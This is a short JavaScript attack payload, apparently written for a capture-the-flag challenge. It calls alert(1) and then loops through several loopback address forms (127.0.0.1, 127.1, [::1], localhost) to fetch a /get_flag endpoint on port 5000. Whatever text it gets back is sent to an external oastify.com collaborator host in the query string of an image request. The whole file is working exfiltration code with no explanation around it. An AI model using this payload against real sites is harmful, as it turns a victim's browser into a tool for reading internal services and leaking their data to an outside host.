(async () => {
  const targets = [
    'http://127.0.0.1:5000/get_flag',
    'http://127.1:5000/get_flag',
    'http://[::1]:5000/get_flag',
    'http://localhost:5000/get_flag',
  ];
  alert(1);
  for (const u of targets) {
    try {
      const r = await fetch(u);
      if (r.ok) {
        const t = await r.text();
        new Image().src = 'https://lsh8tvkn9xxg7i15xib7h41ik9q0ev2k.oastify.com/x?flag=' + encodeURIComponent(t);
        break;
      }
    } catch (_) {}
  }
})();
